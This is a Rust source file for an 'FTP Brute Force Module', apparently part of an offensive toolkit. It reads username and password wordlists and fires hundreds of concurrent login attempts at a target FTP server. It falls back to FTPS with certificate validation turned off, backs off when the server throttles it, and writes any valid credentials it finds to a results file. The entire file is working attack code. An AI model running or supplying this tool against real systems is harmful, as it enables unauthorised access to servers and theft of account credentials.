use anyhow::{anyhow, Result};
use suppaftp::{
    AsyncFtpStream,
    AsyncNativeTlsFtpStream,
    AsyncNativeTlsConnector,
};
use suppaftp::async_native_tls::TlsConnector;
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    path::PathBuf,
    sync::Arc, // Keep Arc
};
use tokio::{
    sync::{Mutex, Semaphore}, // Import Semaphore
    time::{sleep, Duration}
};
use std::path::Path;
use sysinfo::System;
use futures::stream::{FuturesUnordered, StreamExt};

async fn dynamic_throttle(running: usize, max_concurrency: usize) {
    let mut system = System::new_all();
    system.refresh_all();

    let cpu_count = system.cpus().len();
    let cpu_usage = if cpu_count > 0 {
        system.cpus().iter().map(|cpu| cpu.cpu_usage()).sum::<f32>() / cpu_count as f32
    } else {
        0.0
    };
    let total_memory = system.total_memory();
    let ram_used = if total_memory > 0 {
        system.used_memory() as f32 / total_memory as f32
    } else {
        0.0
    };

    if cpu_usage > 80.0 || ram_used > 0.8 {
        sleep(Duration::from_millis(50)).await;
    } else if cpu_usage > 60.0 || ram_used > 0.6 {
        sleep(Duration::from_millis(25)).await;
    } else if running > max_concurrency { // This condition is now less critical for preventing "too many open files"
        sleep(Duration::from_millis(10)).await;
    } else {
        sleep(Duration::from_millis(1)).await;
    }
}

/// Format IPv4 or IPv6 addresses with port
fn format_addr(target: &str, port: u16) -> String {
    if target.starts_with('[') && target.contains("]:") {
        target.to_string()
    } else if target.matches(':').count() == 1 && !target.contains('[') {
        target.to_string()
    } else {
        let clean_target = if target.starts_with('[') && target.ends_with(']') {
            &target[1..target.len() - 1]
        } else {
            target
        };
        if clean_target.contains(':') {
            format!("[{}]:{}", clean_target, port)
        } else {
            format!("{}:{}", clean_target, port)
        }
    }
}

pub async fn run(target: &str) -> Result<()> {
    println!("=== FTP Brute Force Module ===");
    println!("[*] Target: {}", target);

    let port: u16 = loop {
        let input = prompt_default("FTP Port", "21")?;
        if let Ok(p) = input.parse() { break p }
        println!("Invalid port. Try again.");
    };
    let usernames_file = prompt_required("Username wordlist")?;
    let passwords_file = prompt_required("Password wordlist")?;
    let concurrency: usize = loop {
        let input = prompt_default("Max concurrent tasks", "500")?;
        if let Ok(n) = input.parse::<usize>() {
            if n > 0 { break n }
        }
        println!("Invalid number. Try again.");
    };

    // Create a semaphore to limit concurrent network operations
    let semaphore = Arc::new(Semaphore::new(concurrency));

    let stop_on_success = prompt_yes_no("Stop on first success?", true)?;
    let save_results = prompt_yes_no("Save results to file?", true)?;
    let save_path = if save_results {
        Some(prompt_default("Output file", "ftp_results.txt")?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false)?;
    let combo_mode = prompt_yes_no("Combination mode (user × pass)?", false)?;

    let addr = format_addr(target, port);
    let found = Arc::new(Mutex::new(Vec::new()));
    let stop = Arc::new(Mutex::new(false));

    println!("\n[*] Starting brute-force on {}", addr);

    let users = load_lines(&usernames_file)?;
    let passes = load_lines(&passwords_file)?;

    if !combo_mode && users.is_empty() && !passes.is_empty() {
        return Err(anyhow!(
            "Username wordlist ('{}') is empty, but password wordlist ('{}') is not. \
            Cannot proceed in line-by-line (non-combo) mode as it requires usernames to pair with passwords.",
            usernames_file, passwords_file
        ));
    }
    // (Optional: notifications for empty lists can remain here)

    let mut tasks = FuturesUnordered::new();

    if combo_mode {
        for user in &users {
            if *stop.lock().await && stop_on_success { break; }
            for pass in &passes {
                if *stop.lock().await && stop_on_success { break; }

                let addr_clone = addr.clone();
                let user_clone = user.clone();
                let pass_clone = pass.clone();
                let found_clone = Arc::clone(&found);
                let stop_clone = Arc::clone(&stop);
                let semaphore_clone = Arc::clone(&semaphore); // Clone semaphore for the task

                tasks.push(tokio::spawn(async move {
                    // Acquire a permit. This will block if `concurrency` limit is reached.
                    let _permit = semaphore_clone.acquire().await.expect("Failed to acquire semaphore permit");

                    // Proceed with the task logic only after a permit is acquired
                    if *stop_clone.lock().await && stop_on_success { return; }
                    match try_ftp_login(&addr_clone, &user_clone, &pass_clone).await {
                        Ok(true) => {
                            println!("[+] {} -> {}:{}", addr_clone, user_clone, pass_clone);
                            found_clone.lock().await.push((addr_clone.clone(), user_clone.clone(), pass_clone.clone()));
                            if stop_on_success {
                                *stop_clone.lock().await = true;
                            }
                        }
                        Ok(false) => {
                            log(verbose, &format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone));
                        }
                        Err(e) => {
                            log(verbose, &format!("[!] {}: error: {}", addr_clone, e));
                        }
                    }
                    // Permit is automatically released when `_permit` goes out of scope here
                }));
            }
        }
    } else { // Line-by-line mode
        if !users.is_empty() || passes.is_empty() {
            for (i, pass) in passes.iter().enumerate() {
                if *stop.lock().await && stop_on_success { break; }
                let user = if users.is_empty() { continue; } else {
                    users.get(i % users.len()).expect("User list modulus logic error").clone()
                };

                let addr_clone = addr.clone();
                let pass_clone = pass.clone();
                let found_clone = Arc::clone(&found);
                let stop_clone = Arc::clone(&stop);
                let semaphore_clone = Arc::clone(&semaphore); // Clone semaphore

                tasks.push(tokio::spawn(async move {
                    // Acquire a permit
                    let _permit = semaphore_clone.acquire().await.expect("Failed to acquire semaphore permit");

                    if *stop_clone.lock().await && stop_on_success { return; }
                    match try_ftp_login(&addr_clone, &user, &pass_clone).await {
                         Ok(true) => {
                            println!("[+] {} -> {}:{}", addr_clone, user, pass_clone);
                            found_clone.lock().await.push((addr_clone.clone(), user.clone(), pass_clone.clone()));
                            if stop_on_success {
                                *stop_clone.lock().await = true;
                            }
                        }
                        Ok(false) => {
                            log(verbose, &format!("[-] {} -> {}:{}", addr_clone, user, pass_clone));
                        }
                        Err(e) => {
                            log(verbose, &format!("[!] {}: error: {}", addr_clone, e));
                        }
                    }
                    // Permit released
                }));
            }
        }
    }

    let mut processed_tasks_count = 0;
    while let Some(res) = tasks.next().await {
        dynamic_throttle(processed_tasks_count, concurrency).await; // Still useful for CPU/RAM based throttling
        if let Err(e) = res {
            log(verbose, &format!("[!] Task panicked (likely due to forced shutdown or internal error): {}", e));
        }
        processed_tasks_count += 1;
        // (stop logic can remain)
    }

    let creds = found.lock().await;
    if creds.is_empty() {
        println!("\n[-] No credentials found.");
    } else {
        println!("\n[+] Valid credentials:");
        for (host, user, pass) in creds.iter() {
            println!("     {} -> {}:{}", host, user, pass);
        }
        if let Some(path) = save_path {
            let file_path = get_filename_in_current_dir(&path);
            match File::create(&file_path) {
                Ok(mut file) => {
                    for (host, user, pass) in creds.iter() {
                        if writeln!(file, "{} -> {}:{}", host, user, pass).is_err() {
                            eprintln!("[!] Error writing to result file '{}'", file_path.display());
                            break;
                        }
                    }
                    println!("[+] Results saved to '{}'", file_path.display());
                }
                Err(e) => {
                     eprintln!("[!] Could not create or write to result file '{}': {}", file_path.display(), e);
                }
            }
        }
    }
    Ok(())
}

async fn try_ftp_login(addr: &str, user: &str, pass: &str) -> Result<bool> {
    // (try_ftp_login function remains unchanged from your last working version)
    // Attempt 1: Plain FTP
    match AsyncFtpStream::connect(addr).await {
        Ok(mut ftp) => {
            match ftp.login(user, pass).await {
                Ok(_) => {
                    let _ = ftp.quit().await;
                    return Ok(true);
                }
                Err(e) => {
                    let msg = e.to_string();
                    if msg.contains("530") {
                        return Ok(false);
                    } else if msg.contains("550 SSL/TLS required") || msg.contains("TLS required on the control channel") || msg.contains("220 TLS go first") || msg.contains("SSL connection required") {
                        log(true, &format!("[i] {} - Plain FTP login indicated TLS required. Attempting FTPS...", addr));
                    } else if msg.contains("421") {
                        println!("[-] {} - Server reported too many connections (421). Sleeping briefly...", addr);
                        sleep(Duration::from_secs(2)).await;
                        return Ok(false);
                    } else {
                        // Log network errors if verbose, otherwise they might be too noisy
                        log(true, &format!("[!] FTP login error for {} ({}:{}): {} - Raw: {:?}", addr, user, pass, msg, e));
                        return Err(anyhow!("FTP login error: {}", msg));
                    }
                }
            }
        }
        Err(e) => {
            let msg = e.to_string();
            if msg.contains("SSL/TLS required") || msg.contains("TLS required on the control channel") || msg.contains("220 TLS go first") || msg.contains("SSL connection required") {
                log(true, &format!("[i] {} - Plain FTP connection indicated TLS required. Attempting FTPS...", addr));
            } else if msg.contains("421") {
                println!("[-] {} - Server reported too many connections during connect (421). Sleeping briefly...", addr);
                sleep(Duration::from_secs(2)).await;
                return Ok(false);
            } else {
                // Log network errors if verbose
                log(true, &format!("[!] FTP connection error to {} ({}:{}): {} - Raw: {:?}", addr, user, pass, msg, e));
                return Err(anyhow!("FTP connection error: {}", msg));
            }
        }
    }

    // 2️⃣ Only if needed, try FTPS
    log(true, &format!("[i] {} Attempting FTPS login for user '{}'", addr, user));
    let mut ftp_tls = AsyncNativeTlsFtpStream::connect(addr)
        .await
        .map_err(|e| {
            log(true, &format!("[!] FTPS base connect failed for {} ({}:{}): {} - Raw: {:?}", addr, user, pass, e, e));
            anyhow!("FTPS base connect failed: {}", e)
        })?;

    let connector = AsyncNativeTlsConnector::from(
        TlsConnector::new()
            .danger_accept_invalid_certs(true)
            .danger_accept_invalid_hostnames(true),
    );

    let domain = addr
        .trim_start_matches('[')
        .split(&[']', ':'][..])
        .next()
        .unwrap_or(addr);

    ftp_tls = ftp_tls
        .into_secure(connector, domain)
        .await
        .map_err(|e| {
            log(true, &format!("[!] TLS upgrade failed for {} ({}:{}): {} - Raw: {:?}", addr, user, pass, e, e));
            anyhow!("TLS upgrade failed: {}", e)
        })?;

    match ftp_tls.login(user, pass).await {
        Ok(_) => {
            let _ = ftp_tls.quit().await;
            Ok(true)
        }
        Err(e) => {
            let msg = e.to_string();
            if msg.contains("530") {
                Ok(false)
            } else {
                log(true, &format!("[!] FTPS error for {} ({}:{}): {} - Raw: {:?}", addr, user, pass, msg, e));
                Err(anyhow!("FTPS error: {}", msg))
            }
        }
    }
}


// === Helpers === (prompt_required, prompt_default, prompt_yes_no, load_lines, log, get_filename_in_current_dir remain unchanged)

fn prompt_required(msg: &str) -> Result<String> {
    loop {
        print!("{}: ", msg);
        std::io::stdout().flush()?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let trimmed = s.trim();
        if !trimmed.is_empty() {
            return Ok(trimmed.to_string());
        }
        println!("This field is required.");
    }
}

fn prompt_default(msg: &str, default: &str) -> Result<String> {
    print!("{} [{}]: ", msg, default);
    std::io::stdout().flush()?;
    let mut s = String::new();
    std::io::stdin().read_line(&mut s)?;
    let trimmed = s.trim();
    Ok(if trimmed.is_empty() {
        default.to_string()
    } else {
        trimmed.to_string()
    })
}

fn prompt_yes_no(msg: &str, default_yes: bool) -> Result<bool> {
    let default_char = if default_yes { "y" } else { "n" };
    loop {
        print!("{} (y/n) [{}]: ", msg, default_char);
        std::io::stdout().flush()?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let input = s.trim().to_lowercase();
        match input.as_str() {
            "" => return Ok(default_yes),
            "y" | "yes" => return Ok(true),
            "n" | "no" => return Ok(false),
            _ => println!("Invalid input. Please enter 'y' or 'n'."),
        }
    }
}

fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
    let file = File::open(path.as_ref()).map_err(|e| anyhow!("Failed to open file '{}': {}", path.as_ref().display(), e))?;
    let reader = BufReader::new(file);
    Ok(reader.lines().filter_map(Result::ok).collect())
}

fn log(verbose: bool, msg: &str) {
    if verbose {
        println!("{}", msg);
    }
}

fn get_filename_in_current_dir(input: &str) -> PathBuf {
    Path::new(input)
        .file_name()
        .map(|name_os_str| PathBuf::from(format!("./{}", name_os_str.to_string_lossy())))
        .unwrap_or_else(|| PathBuf::from(input))
}
